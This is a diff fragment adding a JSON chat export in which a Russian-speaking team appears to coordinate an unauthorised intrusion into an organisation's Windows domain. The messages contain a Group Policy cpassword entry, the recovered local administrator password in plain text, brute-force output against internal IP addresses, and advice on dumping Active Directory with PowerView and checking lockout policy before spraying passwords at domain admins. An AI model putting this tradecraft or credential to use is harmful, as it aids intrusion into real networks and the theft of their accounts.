+      "msg": "вообщем\nладно.\nпофиг\nчекайте вслепую",
+      "ts": "2020-10-03T15:13:04.739Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:13:04.771Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Kjd669CYc4EWAJKRf",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "значит?",
+      "ts": "2020-10-03T15:12:47.400Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:12:47.440Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "p39LXsu4o6Jmc7qha",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "......",
+      "ts": "2020-10-03T15:12:45.294Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:12:45.336Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gxyEijinPu4dNED4t",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если вы можете обращаться к лдапу чтобы снять ад через powerview",
+      "ts": "2020-10-03T15:12:41.838Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:12:41.879Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gqBwTvsKa9ygCHcSw",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "мы с дедкиа своего",
+      "ts": "2020-10-03T15:12:24.416Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-03T15:12:24.436Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jYbvz85obB6S5zWxv",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "как мы это чекнем",
+      "ts": "2020-10-03T15:12:21.026Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-03T15:12:21.066Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DS2jim9RTFaF2bz2H",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ад снят через powerview",
+      "ts": "2020-10-03T15:12:15.490Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:12:15.520Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "teKp8iipFqzoBJiWn",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "я писал выше что МЫ НЕ В ДОМЕНЕ",
+      "ts": "2020-10-03T15:12:12.386Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-03T15:12:12.411Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kPXYpSQaWfG2bienn",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "состав?",
+      "ts": "2020-10-03T15:12:08.377Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:12:08.399Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "wj2EE57yMPcs8Go3c",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ад снят?",
+      "ts": "2020-10-03T15:12:07.378Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:12:07.401Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "B2287MMkwKYBDQ33P",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "мы под впном тут сидим",
+      "ts": "2020-10-03T15:12:00.713Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:12:00.748Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SKiMSA2coNDDpnQjj",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это не отрабатывает",
+      "ts": "2020-10-03T15:11:56.357Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:11:56.386Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2NeFSpZvCYQ8DNo7X",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "говорит о чем-нибудь?)",
+      "ts": "2020-10-03T15:11:48.656Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:11:48.682Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cgEtQ4sSDGnGAQaKz",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "net accounts /dom",
+      "ts": "2020-10-03T15:11:42.982Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:11:43.023Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WKskAdvSmddBaayac",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "badpasswordcount",
+      "ts": "2020-10-03T15:11:32.088Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:11:32.119Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "htdyKJ8ePvQehwG6W",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "охххххххх\nпроверить надо чтобы не улетели",
+      "ts": "2020-10-03T15:11:25.779Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:11:25.826Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PQ4kQ8z65NehynGHD",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если локаут",
+      "ts": "2020-10-03T15:11:02.475Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-03T15:11:02.499Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RnnT57XixQwiCgN6u",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=hf6u7cfegoFzqXhAz) смысл тогда?",
+      "ts": "2020-10-03T15:10:54.812Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-03T15:10:54.847Z",
+      "attachments": [
+        {
+          "text": "это проверить его на всех домен админов",
+          "author_name": "tl2",
+          "author_icon": "/avatar/tl2",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=hf6u7cfegoFzqXhAz",
+          "attachments": [],
+          "ts": "2020-10-03T15:06:37.308Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=hf6u7cfegoFzqXhAz",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HsRPZaKcXajKKMCLn",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это же не Слепая с тнт скрипту подсказывает, логично?",
+      "ts": "2020-10-03T15:09:29.265Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:09:29.293Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "H96uYZ4kcMAtmQg4b",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "когда локаут близко",
+      "ts": "2020-10-03T15:09:06.849Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:09:06.887Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vFb9TfcFxbkzSDTB4",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "там же скипается",
+      "ts": "2020-10-03T15:09:03.249Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:09:03.282Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QifTpBfmXXTiKAmEc",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "конечно есть\nвы же скриптом проверяете когда автобрут пускаете?",
+      "ts": "2020-10-03T15:09:01.134Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:09:01.161Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "s99JcJ2NP9SpveCKq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "блять. это вообще вопрос?",
+      "ts": "2020-10-03T15:08:47.781Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:08:47.817Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4qwzx3Ns8mcDaeFLF",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "мы вчера как минунм по трем паролям проверяли ДА, у нас нет возможности проверить локаут политку домена\nони не улетят в лок если их сейчас чекать?",
+      "ts": "2020-10-03T15:08:03.669Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-03T15:08:03.703Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KkAzbtRPAWePtcpTn",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "второе это проверить ЛА креды данные на РАЗНЫЕ группы серверов и АРМов - все это есть в АД",
+      "ts": "2020-10-03T15:06:50.868Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:06:50.902Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hf6u7cfegoFzqXhAz",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это проверить его на всех домен админов",
+      "ts": "2020-10-03T15:06:37.308Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:06:37.340Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SENjLSeq6mEC9xtBB",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "первое что имеет смысл сделать",
+      "ts": "2020-10-03T15:06:32.152Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:06:32.191Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9XBRBhZu2xt25n88m",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "так как это новый пасс и он ТОЧНО технарский",
+      "ts": "2020-10-03T15:06:27.201Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:06:27.226Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "T6aY92Soqv5FTCear",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "можно попробовать с SID поиграться но это не верняк",
+      "ts": "2020-10-03T15:06:10.912Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:06:10.949Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "J6hnSvqetS7rRe2xy",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "к .37 не цепляется",
+      "ts": "2020-10-03T15:05:14.723Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:05:14.747Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ghaP3ASnttZxakK7p",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n[-] 10.1.4.4:445          - 10.1.4.4:445 - Failed: '.\\Administrator:XhY?8WJSI',\n```",
+      "ts": "2020-10-03T15:05:08.425Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:05:08.492Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZizG8DTLZM5AMmHhf",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "поняли, не проконтролировали user8 что брутит,\nкак нам понять в каких групах сосоит машина?\nесли мы это из груповых политик вытащили",
+      "ts": "2020-10-03T15:04:10.233Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-03T15:04:10.273Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CQDe2KXhfrDnZQ6kq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nchangeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\"\n``` \nэто ЯВНО указывает на то что это локальный пользователь ПК какого-то а ТОЧНО не сервисный аккаунт",
+      "ts": "2020-10-03T15:03:44.615Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:03:44.680Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6D9TvALPZ3GAhr7dm",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "я понимаю что все хотят выпить пивка уже и спокойно отдохнуть,  но давайте прекратим тупеж и продуктивно отработаем те крохи данных которые в наличии",
+      "ts": "2020-10-03T15:02:55.683Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:02:55.718Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "iaFD5oBiAxPQv4KP3",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "боже",
+      "ts": "2020-10-03T15:02:18.404Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:02:18.432Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pzqMazDB4th49dGtC",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "а не скуль сервис",
+      "ts": "2020-10-03T15:02:17.644Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:02:17.674Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oE7mb6Zjxv4jHygB5",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "скульсервер",
+      "ts": "2020-10-03T15:02:15.140Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:02:15.181Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gBcHLdHrWZQ8pMgX5",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=xaeRe2fBZd38i8oFH) .",
+      "ts": "2020-10-03T15:02:09.439Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:02:09.491Z",
+      "attachments": [
+        {
+          "text": "проверьте ДК, скуль и пару пользовательских пк",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=xaeRe2fBZd38i8oFH",
+          "attachments": [],
+          "ts": "2020-10-03T14:49:06.183Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=xaeRe2fBZd38i8oFH",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZHoDaBbfai34MaNEB",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это блин не смешно уже даже\nзачем на 1433 этот пасс тестить",
+      "ts": "2020-10-03T15:01:51.058Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:01:51.093Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yDXgqqdFRz84DFnLu",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n[-] 10.7.20.30:445        - 10.7.20.30:445 - Failed: '.\\Administrator:XhY?8WJSI',\n``` \n```\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\Administrator:XhY?8WJSI (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\Administrator:XhY?8WJSI (Incorrect: )\n```",
+      "ts": "2020-10-03T15:01:21.535Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:01:21.649Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gfGSZ78vC2h3Ry2Jk",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "парни, мы же блять сисадмины в конце концов\nсами же логику должны понимать групповых политик\nЛА из ГПО будет либо на конкретных машинах которые в конкретных группах либо на сегментах сети",
+      "ts": "2020-10-03T14:55:53.444Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T14:55:53.472Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KhbckhqMi9fENTh25",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "по sid?",
+      "ts": "2020-10-03T14:55:32.087Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:55:32.120Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CdwqJAeRPu2RBzn4H",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "@tl1 внесу поправку, проверять надо пользовательские и серверные машины относящиеся к конкретным сабнетам",
+      "ts": "2020-10-03T14:55:07.242Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T14:55:07.283Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "xaeRe2fBZd38i8oFH",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "проверьте ДК, скуль и пару пользовательских пк",
+      "ts": "2020-10-03T14:49:06.183Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:49:06.228Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ua4bPjxvhEKTaqXp6",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "так что может быть везде",
+      "ts": "2020-10-03T14:48:37.133Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T14:48:37.156Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DuHErYS9y4FrbYiHe",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "фиг знает - это из групповых политик\n`<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"><User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"Administrator (built-in)\" image=\"2\" changed=\"2017-10-27 14:28:20\" uid=\"{C36CFE81-5D6F-444F-981A-E4A0095AEB9F}\"><Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"ZDNIgxXxcpyYuVsI1dItzBw3icVJ2LMHIv2RVOAw1mA\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" subAuthority=\"RID_ADMIN\" userName=\"Administrator (built-in)\"/></User>`",
+      "ts": "2020-10-03T14:47:59.543Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T14:47:59.586Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "d6t3cWJKFKBB299BD",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ЛА где?",
+      "ts": "2020-10-03T14:46:31.538Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:46:31.568Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BjahTqxFbmAtfk36t",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "пароль для ЛА XhY?8WJSI",
+      "ts": "2020-10-03T14:45:37.455Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T14:45:37.494Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5n273GubDZi3K8Adc",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=icgaSNNqbnCtwaMpJ) Это список компов домена, который лежит у админов в шаре",
+      "ts": "2020-10-03T14:31:22.410Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T14:31:22.451Z",
+      "attachments": [
+        {
+          "text": "это у нас что?",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=icgaSNNqbnCtwaMpJ",
+          "attachments": [],
+          "ts": "2020-10-03T14:16:11.623Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=icgaSNNqbnCtwaMpJ",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YNijda5DTafSuQG9E",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "40 минут на гугл это долго",
+      "ts": "2020-10-03T14:29:51.153Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:29:51.197Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BWPSiFjAYa5SRCkYc",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "А как давно заработало?",
+      "ts": "2020-10-03T14:29:26.473Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:29:26.506Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4qSPj9R7C9p4XqHt9",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ваша же задача",
+      "ts": "2020-10-03T14:28:49.584Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:28:49.607Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "q8vpFsg347xPdGhcQ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "кто-нибудь гуглил?)",
+      "ts": "2020-10-03T14:28:45.548Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:28:45.591Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zHnsE9LyecStihpsQ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "уже 50 мин прошло)",
+      "ts": "2020-10-03T14:26:53.462Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:26:53.515Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mK946crnKAXNY2x7c",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "решили?",
+      "ts": "2020-10-03T14:26:08.628Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:26:08.654Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aavngvDwL4XAa6iJq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nfor /f %s in (srv.txt) do @ (echo %s)\n``` \nну вот тут ошибки точно быть не должно)))",
+      "ts": "2020-10-03T14:16:13.444Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T14:16:13.511Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "icgaSNNqbnCtwaMpJ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это у нас что?",
+      "ts": "2020-10-03T14:16:11.623Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:16:11.669Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hWvJ44bDB3Xy2SoC2",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-03T14:15:11.598Z",
+      "msg": "",
+      "file": {
+        "_id": "EqeYEp9DMNnmewPXo",
+        "name": "comp-list_from_admins.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "comp-list_from_admins.txt",
+          "title_link": "/file-upload/EqeYEp9DMNnmewPXo/comp-list_from_admins.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T14:15:11.705Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "m9mqW9e9Wa6qLjvmR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "?",
+      "ts": "2020-10-03T14:10:07.396Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:10:07.424Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "okmc33q5nK4RZspMo",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nfor /f %s in (srv.txt) do @ (echo %s)\n```",
+      "ts": "2020-10-03T14:10:05.095Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:10:05.156Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3NxuqogwaMDZowFH3",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "а так",
+      "ts": "2020-10-03T14:09:52.979Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:09:53.016Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gLmRLDASkqQntxWae",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "добавьте () для первого цикла",
+      "ts": "2020-10-03T14:06:18.773Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:06:18.801Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dmFo7ZWJqd2QRryFc",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "получилось?",
+      "ts": "2020-10-03T14:05:14.208Z",
+      "u": {
